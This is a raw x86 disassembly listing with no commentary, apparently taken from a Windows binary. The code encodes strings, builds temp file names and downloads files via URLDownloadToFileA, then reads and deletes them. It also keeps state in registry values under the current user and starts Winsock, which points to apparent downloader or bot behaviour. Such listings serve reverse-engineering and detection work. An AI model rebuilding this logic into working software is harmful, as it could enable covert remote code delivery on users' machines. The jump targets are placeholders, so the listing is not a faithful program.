mov [ edx + eax ] dl
mov al 0x1
pop ebp
pop ecx
retn 0xc
push ebx
mov ebx [ esp + 0x18 ]
push esi
push edi
jmp r-xdata
mov esi [ esp + 0x18 ]
mov al [ esi + ebp ]
mov ecx [ esp + 0x10 ]
movzx edi al
mov eax edi
shr eax 0x2
push eax
add ebp 0x1
call sub_409350
and edi 0x3
mov [ edx + ebx ] al
add edx 0x1
shl edi 0x4
cmp ebp [ esp + 0x1c ]
jge r-xdata
mov ecx [ esp + 0x10 ]
push edi
call sub_409350
mov [ edx + ebx ] al
add edx 0x1
mov [ edx + ebx ] 0x3d
mov al [ esi + ebp ]
movzx esi al
mov ecx esi
shr ecx 0x4
or edi ecx
push edi
mov edi [ esp + 0x14 ]
mov ecx edi
add ebp 0x1
call sub_409350
and esi 0xf
add esi esi
mov [ edx + ebx ] al
add edx 0x1
add esi esi
cmp ebp [ esp + 0x1c ]
jge r-xdata
pop edi
pop esi
mov [ edx + ebx ] 0x0
pop ebx
mov al 0x1
pop ebp
pop ecx
retn 0xc
push esi
mov ecx edi
call sub_409350
mov [ edx + ebx ] al
jmp r-xdata
mov eax [ esp + 0x18 ]
mov al [ eax + ebp ]
movzx edi al
mov ecx edi
shr ecx 0x6
or esi ecx
push esi
mov esi [ esp + 0x14 ]
mov ecx esi
add ebp 0x1
call sub_409350
and edi 0x3f
mov [ edx + ebx ] al
push edi
mov ecx esi
add edx 0x1
call sub_409350
mov [ edx + ebx ] al
jmp r-xdata
add edx 0x1
mov [ edx + ebx ] 0x3d
add edx 0x1
cmp ebp [ esp + 0x1c ]
jl r-xdata
sub_4094d0
sub esp 0x414
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x410 ] eax
push ebx
push ebp
mov ebp [ esp + 0x420 ]
push esi
push edi
lea eax [ esp + 0x20 ]
push eax
push 0x400
mov edi ecx
mov [ esp + 0x1c ] 0xffffffff
call [ GetTempPathA@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x4
push rw-data
mov edx ecx
push edx
call [ GetTempFileNameA@IAT ]
mov eax [ esp + 0x42c ]
push eax
lea ebx [ edi + 0x4 ]
push ebp
mov ecx ebx
call sub_401630
mov ecx [ ebx ]
mov edx [ ecx + 0xc ]
mov [ esp + 0x10 ] eax
lea eax [ edx + edi + 0x14 ]
push eax
call sub_405930
mov ecx [ ebx ]
mov edx [ ecx + 0xc ]
mov esi eax
lea eax [ edx + edi + 0x4 ]
push eax
call sub_405930
add esi eax
lea eax [ edi + 0x14 ]
push eax
call sub_405930
mov ecx [ esp + 0x1c ]
add eax esi
lea edx [ eax + ecx * 2 + 0xa0 ]
push edx
call sub_402260
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
lea eax [ edi + 0x14 ]
push eax
push rw-data
push esi
call sub_4060b0
mov eax [ edi ]
push esi
mov [ esp + 0x28 ] eax
call sub_405930
mov edx [ esp + 0x28 ]
add eax esi
add esp 0x10
push eax
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
mov ecx [ ebx ]
mov edx [ ecx + 0xc ]
mov ecx [ esp + 0x430 ]
lea eax [ edx + edi ]
xor edx edx
cmp ecx 0xffffffff
sete dl
push edx
push ecx
lea ecx [ eax + 0x14 ]
push ecx
add eax 0x4
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_405930
add eax esi
add esp 0x4
push eax
call sub_4060b0
push esi
call sub_405930
mov edx [ esp + 0x2c ]
add esp 0x1c
add eax esi
push eax
push edx
push ebp
mov ecx ebx
call sub_4093b0
push 0x0
push 0x0
lea eax [ esp + 0x28 ]
push eax
push esi
push 0x0
call URLDownloadToFileA
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_402280
mov eax [ esp + 0x18 ]
add esp 0x4
push eax
push eax
push 0x3
push eax
push 0x1
push 0x80000000
lea ecx [ esp + 0x38 ]
push ecx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x10 ] ebx
je r-xdata
mov ecx [ esp + 0x420 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x414
retn 0xc
push 0x0
push ebx
call [ GetFileSize@IAT ]
mov ebp eax
test ebp ebp
jg r-xdata
lea eax [ ebp + 0x1 ]
push eax
call sub_402260
mov ecx [ esp + 0x14 ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push ebx
push 0x0
lea eax [ esp + 0x20 ]
push eax
push ebp
push ebx
push ecx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push ecx
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
lea edx [ esp + 0x20 ]
push edx
call [ DeleteFileA@IAT ]
mov edx [ esp + 0x10 ]
push edx
call [ CloseHandle@IAT ]
lea eax [ esp + 0x20 ]
push eax
call [ DeleteFileA@IAT ]
cmp [ esp + 0x1c ] 0x0
jbe r-xdata
call [ CloseHandle@IAT ]
lea edx [ esp + 0x20 ]
push edx
call [ DeleteFileA@IAT ]
xor eax eax
jmp r-xdata
push ebx
call sub_402280
add esp 0x4
mov [ ebx + ebp ] 0x0
mov edx [ edi ]
mov eax [ edx ]
push ebx
mov ecx edi
call eax
mov [ esp + 0x14 ] eax
jmp r-xdata
sub_409720
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov al 0x1
retn 0x4
push 0x0
push eax
mov eax [ ecx - 0x140 ]
mov edx [ eax + 0x10 ]
lea eax [ edx + ecx - 0x13c ]
push eax
call sub_4059c0
add esp 0xc
sub_409750
mov eax 0x140c
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1408 ] eax
push ebx
mov ebx [ esp + 0x1414 ]
mov eax [ ebx - 0x140 ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + ebx - 0x13c ] 0x0
push esi
lea esi [ ebx - 0x140 ]
je r-xdata
mov ecx [ esp + 0x1410 ]
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x140c
retn
push ebp
push edi
lea edx [ esp + 0x10 ]
push edx
call [ GetSystemTimeAsFileTime@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x430 ]
push ecx
mov [ esp + 0x434 ] 0x0
call sub_405f20
lea edx [ esp + 0x434 ]
push rw-data
push edx
call sub_405980
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x44a ]
push ecx
call sub_405e40
lea edx [ esp + 0x444 ]
push rw-data
push edx
call sub_405980
mov ecx [ esp + 0x1448 ]
lea eax [ esp + 0x144c ]
push eax
push ecx
lea edx [ esp + 0x467 ]
push edx
call sub_405f90
lea eax [ esp + 0x458 ]
push rw-data
push eax
call sub_405980
lea ecx [ esp + 0x460 ]
push ecx
call sub_405930
add esp 0x3c
lea edx [ esp + 0x18 ]
push edx
push 0x400
mov edi eax
call [ GetTempPathA@IAT ]
lea eax [ esp + 0x18 ]
push eax
push 0x7
push rw-data
mov ecx eax
push ecx
call [ GetTempFileNameA@IAT ]
add edi 0x10
push edi
lea edx [ esp + 0x41c ]
push edx
mov ecx esi
call sub_401630
mov ebp eax
mov eax [ esi ]
mov ecx [ eax + 0x10 ]
lea edx [ ecx + ebx - 0x13c ]
push edx
call sub_405930
mov edi eax
mov eax [ esi ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + ebx - 0x140 ]
push edx
call sub_405930
add edi eax
mov eax [ esi ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + ebx - 0x130 ]
push edx
call sub_405930
add eax edi
lea eax [ eax + ebp * 2 + 0x20 ]
push eax
call sub_402260
add esp 0x10
mov edi eax
test edi edi
je r-xdata
pop edi
pop ebp
mov eax [ esi ]
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
add ecx ebx
lea edx [ ecx - 0x130 ]
push edx
add ecx 0xfffffec0
push ecx
lea ecx [ eax + ebx - 0x13c ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060b0
push edi
call sub_405930
add esp 0x18
add eax edi
push eax
push ebp
lea edx [ esp + 0x420 ]
push edx
mov ecx esi
call sub_4093b0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
push edi
push 0x0
call URLDownloadToFileA
lea ecx [ esp + 0x18 ]
push ecx
call [ DeleteFileA@IAT ]
push edi
call sub_402280
add esp 0x4
sub_409950
sub esp 0x8
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov ebx [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
mov eax [ esi + 0x4 ]
mov edi ebx
sub edi [ esi + 0x8 ]
mov ecx ebp
sbb ecx [ esi + 0xc ]
cdq
cmp ecx edx
jl r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn
jg r-xdata
pop edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebp
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x8
retn
cmp edi eax
jbe r-xdata
sub_4099a0
mov eax [ esp + 0x4 ]
push ebp
push edi
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
mov ebp ecx
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
push esi
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ebx eax
lea ecx [ ebx + 0x1 ]
push ecx
call sub_402260
add esp 0x4
push 0x0
lea edx [ esp + 0x18 ]
push edx
push ebx
mov esi eax
push esi
push edi
call [ ReadFile@IAT ]
test eax eax
push edi
setne bl
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
pop edi
xor al al
pop ebp
retn 0x4
push esi
call sub_402280
add esp 0x4
pop esi
pop ebx
pop edi
xor al al
pop ebp
retn 0x4
mov eax [ esp + 0x14 ]
push eax
push esi
lea ecx [ ebp + 0x4 ]
call sub_401710
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx + esi ] 0x0
mov edx [ ebp ]
add eax 0x10
push eax
mov eax [ edx ]
mov ecx ebp
call eax
push esi
call sub_402280
add esp 0x4
pop esi
pop ebx
pop edi
mov al 0x1
pop ebp
retn 0x4
sub_409a60
sub esp 0x104
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x100 ] eax
push esi
push edi
mov edi [ esp + 0x110 ]
mov esi ecx
xor eax eax
mov cl 0x30
mov [ esp + eax + 0x8 ] cl
mov [ esp + eax + 0x9 ] 0x0
add eax 0x1
cmp eax 0x8
jl r-xdata
push 0x3d
push 0x100
lea eax [ esp + 0x18 ]
push eax
push rw-data
push edi
call sub_4060d0
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x30 ] 0x0
call sub_405930
lea edx [ esp + eax + 0x20 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
push 0x0
push edx
lea edx [ ecx + esi + 0x4 ]
push edx
call sub_4059c0
add esp 0x24
push 0x3d
push 0x100
lea eax [ esi + 0x13e ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060d0
add esp 0x14
push 0x3d
push 0x100
lea ecx [ esi + 0x29 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060d0
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x18 ]
add esp 0x14
push 0x3d
push 0x100
lea ecx [ eax + esi + 0x8 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060d0
add esp 0x14
push 0x3d
push 0x100
lea edx [ esp + 0x10 ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060d0
lea eax [ esp + 0x1c ]
push eax
call sub_405f60
mov ecx [ esp + 0x120 ]
add esp 0x18
pop edi
mov [ esi + 0x2a2 ] eax
pop esi
xor ecx esp
call sub_40acd2
add esp 0x104
retn 0x4
sub_409b90
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
lea ecx [ esi + 0x15 ]
call sub_409310
mov ecx [ esp + 0xc ]
push ecx
lea ecx [ esi + 0x129 ]
call sub_4090c0
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0x14 ]
push edx
mov edx [ ecx + 0xc ]
push eax
lea ecx [ edx + esi + 0x4 ]
call sub_409060
pop esi
retn 0x14
sub_409bd0
sub esp 0x10
lea eax [ esp + 0x4 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push esi
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0xc ]
push eax
mov esi 0x4
push 0x0
push rw-data
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] esi
call sub_401580
mov ecx [ esp + 0x1c ]
add esp 0x4
push eax
push ecx
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x10
retn
mov [ esp + 0x4 ] esi
call sub_402c00
push esi
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] eax
mov eax [ esp + 0xc ]
push eax
push 0x0
push rw-data
call sub_401580
mov ecx [ esp + 0x1c ]
add esp 0x4
push eax
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x4 ] esi
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp + 0xc ]
pop esi
add esp 0x10
retn
mov edx [ esp + 0x8 ]
push edx
call [ RegCloseKey@IAT ]
xor eax eax
pop esi
add esp 0x10
retn
sub_409ca0
sub esp 0x10
lea eax [ esp ]
push eax
push rw-data
mov [ esp + 0xc ] 0x0
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push esi
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov esi 0x4
push 0x0
push rw-data
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] esi
call sub_401580
mov ecx [ esp + 0x18 ]
add esp 0x4
push eax
push ecx
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
xor al al
add esp 0x10
retn
push esi
lea edx [ esp + 0xc ]
push edx
push esi
push 0x0
push rw-data
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x1c ] 0x1
call sub_401580
add esp 0x4
push eax
mov eax [ esp + 0x18 ]
push eax
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0xc ] esi
je r-xdata
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
cmp [ esp + 0x8 ] 0x0
pop esi
setne al
add esp 0x10
retn
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
xor al al
pop esi
add esp 0x10
retn
sub_409d80
sub esp 0x8
lea eax [ esp ]
push eax
push rw-data
mov [ esp + 0xc ] 0x0
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
add esp 0x8
retn
push 0x4
lea ecx [ esp + 0x8 ]
push ecx
push 0x4
push eax
push rw-data
mov [ esp + 0x18 ] eax
call sub_401580
mov edx [ esp + 0x14 ]
add esp 0x4
push eax
push edx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp ]
push ecx
call [ RegCloseKey@IAT ]
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
add esp 0x8
retn
sub_409e00
mov eax 0x1020
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x101c ] eax
mov eax [ esp + 0x1024 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
mov edi [ esi + 0x10 ]
xor ebx ebx
add edi 0x10
push edi
mov [ esp + 0x20 ] eax
xor ebp ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] ebx
call sub_402260
add esp 0x4
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esp + 0x1c ]
mov eax [ edx + 0x10 ]
push ecx
lea ecx [ eax + esi + 0x4 ]
call sub_402850
test al al
je r-xdata
xor al al
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_402280
mov al [ esp + 0x17 ]
add esp 0x4
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x10 ]
lea ecx [ edx + esi + 0x4 ]
call sub_402790
mov [ esp + 0x28 ] eax
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
test al al
jne r-xdata
mov ecx [ esp + 0x102c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x1020
retn 0x4
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x10 ]
lea ecx [ edx + esi + 0x4 ]
call sub_4029b0
add edi 0xfffffff0
mov [ esp + 0x24 ] edi
mov edi edi
push 0xffffffff
push 0x0
push edi
call sub_4094d0
cmp eax ebp
jne r-xdata
push ebx
add eax 0x10
push eax
push edi
call sub_4094d0
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov [ esp + 0x13 ] 0x1
mov eax [ esi + 0x10 ]
mov edx [ esp + 0x28 ]
imul eax ebp
shr edx 0xa
push edx
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
push eax
mov eax [ esp + 0x24 ]
push eax
push rw-data
mov [ esp + 0x24 ] 0x0
call sub_401580
add esp 0x4
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_4060b0
mov edx [ esi ]
mov edx [ edx + 0xc ]
add esp 0x14
lea eax [ esp + 0x2c ]
push eax
mov ecx esi
call edx
mov edi ebp
sub edi ebx
sub edi 0x1
test edi edi
jle r-xdata
cmp [ esp + 0x14 ] 0x4
jge r-xdata
jge r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x4 ]
imul eax edi
mov edx [ ecx + 0x10 ]
push eax
lea ecx [ edx + esi + 0x4 ]
call sub_402960
test edi edi
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
add [ esp + 0x14 ] 0x1
push 0x3e8
lea ecx [ ecx + esi + 0x4 ]
call sub_409030
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x4 ]
imul edx ebx
mov ecx [ eax + 0x10 ]
push edx
lea ecx [ ecx + esi + 0x4 ]
call sub_4028f0
jmp r-xdata
mov eax [ esp + 0x20 ]
add eax 0x1
and eax 0x7ff
mov ebx ebp
mov [ esp + 0x20 ] eax
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x4 ]
imul eax ebp
mov edx [ ecx + 0x10 ]
push eax
lea ecx [ edx + esi + 0x4 ]
call sub_4028f0
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
push 0x4e20
lea ecx [ ecx + esi + 0x4 ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0xc ]
push 0x14
lea ecx [ edx + esi + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esi + 0x4 ]
mov edi [ esp + 0x18 ]
mov edx [ ecx + 0x10 ]
push eax
lea eax [ edi + 0x10 ]
push eax
lea ecx [ edx + esi + 0x4 ]
call sub_402890
test eax eax
mov ecx esi
je r-xdata
jmp r-xdata
call sub_409030
sub_40a040
push ecx
push esi
lea eax [ esp + 0x4 ]
push eax
push rw-data
mov esi ecx
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
pop ecx
retn
push 0x400
add esi 0x2a6
push esi
push 0x1
push eax
push rw-data
call sub_401580
mov ecx [ esp + 0x18 ]
add esp 0x4
push eax
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ecx
retn
sub_40a0b0
push ecx
push esi
lea eax [ esp + 0x4 ]
push eax
push rw-data
mov esi ecx
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
pop ecx
retn
push 0x40
add esi 0x6a6
push esi
push 0x1
push eax
push rw-data
call sub_401580
mov ecx [ esp + 0x18 ]
add esp 0x4
push eax
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ecx
retn
sub_40a120
push esi
mov esi ecx
call sub_40a040
lea eax [ esi + 0x6a6 ]
push eax
lea ecx [ esi + 0x2a6 ]
push ecx
call sub_402120
add esp 0x8
test al al
je r-xdata
pop esi
retn
mov ecx esi
pop esi
jmp sub_40a0b0
sub_40a180
push ecx
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
mov [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x4 ]
lea ecx [ esi + 0x4 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov [ esi ] rw-data
mov edx [ eax + 0x4 ]
mov [ edx + esi + 0x4 ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x80
push rw-data
mov [ edx + esi + 0x4 ] rw-data
call sub_4016d0
lea eax [ esi + 0x15 ]
push 0x100
push eax
call sub_4022d0
add esp 0x8
mov eax esi
pop esi
pop ecx
retn 0x4
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x115 ] rw-data
lea ecx [ esi + 0x221 ]
mov [ esi + 0x21d ] rw-data
call sub_4090a0
sub_40a220
push ecx
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
mov [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx ] rw-data
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov [ esi + eax ] rw-data
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx ] rw-data
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push 0x80
mov [ esi + ecx ] rw-data
push rw-data
mov ecx esi
call sub_4016d0
mov eax esi
pop esi
pop ecx
retn 0x4
mov [ esi ] rw-data
mov [ esi + 0x4 ] rw-data
lea ecx [ esi + 0x110 ]
mov [ esi + 0x10c ] rw-data
call sub_4090a0
sub_40a2a0
push 0xffffffff
push sub_41523f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x10 ] esi
xor ebx ebx
cmp [ esp + 0x24 ] ebx
mov [ esp + 0xc ] ebx
je r-xdata
push ebx
mov ecx esi
call sub_40a220
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx ] rw-data
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov [ esi + eax ] rw-data
mov ecx [ esi ]
mov edx [ ecx + 0x10 ]
mov [ esi + edx ] rw-data
mov eax [ esi ]
mov eax [ eax + 0x10 ]
lea ecx [ eax - 0x140 ]
mov [ eax + esi - 0x4 ] ecx
mov [ esi + 0x4 ] 0x23c34600
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov eax esi
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x14
retn 0x4
mov [ esi ] rw-data
mov [ esi + 0x10 ] rw-data
lea ecx [ esi + 0x11c ]
mov [ esi + 0x118 ] rw-data
call sub_4090a0
mov [ esi + 0x140 ] rw-data
mov [ esi + 0x144 ] bl
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] 0x3
sub_40a380
mov eax 0x140c
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1408 ] eax
push ebx
mov ebx [ esp + 0x1414 ]
push esi
lea esi [ ebx - 0x140 ]
mov ecx esi
call sub_409950
test al al
je r-xdata
mov ecx [ esp + 0x1410 ]
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x140c
retn
mov eax [ esi ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + ebx - 0x13c ] 0x0
je r-xdata
push ebp
push edi
lea edx [ esp + 0x10 ]
push edx
call [ GetSystemTimeAsFileTime@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x430 ]
push ecx
mov [ esp + 0x434 ] 0x0
call sub_405f20
lea edx [ esp + 0x434 ]
push rw-data
push edx
call sub_405980
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x44a ]
push ecx
call sub_405e40
lea edx [ esp + 0x444 ]
push rw-data
push edx
call sub_405980
mov ecx [ esp + 0x1448 ]
lea eax [ esp + 0x144c ]
push eax
push ecx
lea edx [ esp + 0x467 ]
push edx
call sub_405f90
lea eax [ esp + 0x458 ]
push rw-data
push eax
call sub_405980
lea ecx [ esp + 0x460 ]
push ecx
call sub_405930
add esp 0x3c
lea edx [ esp + 0x18 ]
push edx
push 0x400
mov edi eax
call [ GetTempPathA@IAT ]
lea eax [ esp + 0x18 ]
push eax
push 0x7
push rw-data
mov ecx eax
push ecx
call [ GetTempFileNameA@IAT ]
add edi 0x10
push edi
lea edx [ esp + 0x41c ]
push edx
mov ecx esi
call sub_401630
mov ebp eax
mov eax [ esi ]
mov ecx [ eax + 0x10 ]
lea edx [ ecx + ebx - 0x13c ]
push edx
call sub_405930
mov edi eax
mov eax [ esi ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + ebx - 0x140 ]
push edx
call sub_405930
add edi eax
mov eax [ esi ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + ebx - 0x130 ]
push edx
call sub_405930
add eax edi
lea eax [ eax + ebp * 2 + 0x20 ]
push eax
call sub_402260
add esp 0x10
mov edi eax
test edi edi
je r-xdata
pop edi
pop ebp
mov eax [ esi ]
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
add ecx ebx
lea edx [ ecx - 0x130 ]
push edx
add ecx 0xfffffec0
push ecx
lea ecx [ eax + ebx - 0x13c ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4060b0
push edi
call sub_405930
add esp 0x18
add eax edi
push eax
push ebp
lea edx [ esp + 0x420 ]
push edx
mov ecx esi
call sub_4093b0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
push edi
push 0x0
call URLDownloadToFileA
lea ecx [ esp + 0x18 ]
push ecx
call [ DeleteFileA@IAT ]
push edi
call sub_402280
add esp 0x4
sub_40a580
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
mov eax [ esp + 0x408 ]
push esi
mov esi ecx
push 0x400
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x4 ]
push edx
mov ecx esi
call sub_4099a0
mov ecx [ esp + 0x404 ]
pop esi
xor ecx esp
call sub_40acd2
add esp 0x404
retn 0x4
sub_40a5f0
sub esp 0x19c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x198 ] eax
push esi
push edi
mov edi [ esp + 0x1a8 ]
lea eax [ esp + 0x10 ]
push eax
push 0x101
mov esi ecx
call Ordinal_WSOCK32_115
test eax eax
jne r-xdata
mov ecx [ esp + 0x1a0 ]
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x19c
retn 0x4
push rw-data
push 0x1
push 0x1f0003
call [ OpenEventA@IAT ]
test eax eax
jne r-xdata
push rw-data
push eax
push 0x1
push eax
call [ CreateEventA@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0xc ]
lea ecx [ edx + esi + 0x4 ]
mov [ esp + 0xc ] eax
call sub_409bd0
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx esi
call sub_409b90
push edi
mov ecx esi
call sub_40a580
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov edi [ edx + esi + 0x4 ]
add edi 0x4
call [ GetCurrentProcessId@IAT ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ edi ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
add esp 0xc
call Ordinal_WSOCK32_116
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
push ebx
add edi 0x4
call [ GetCurrentProcessId@IAT ]
push eax
push rw-data
call sub_401580
mov edx [ esi + 0x4 ]
add esp 0x4
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
lea edi [ esi + 0x2a6 ]
push edi
push 0x400
call [ GetTempPathA@IAT ]
push edi
call sub_402c00
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call [ GetTempFileNameA@IAT ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov ebx [ ecx + esi + 0x4 ]
push edi
push rw-data
add ebx 0x4
call sub_401580
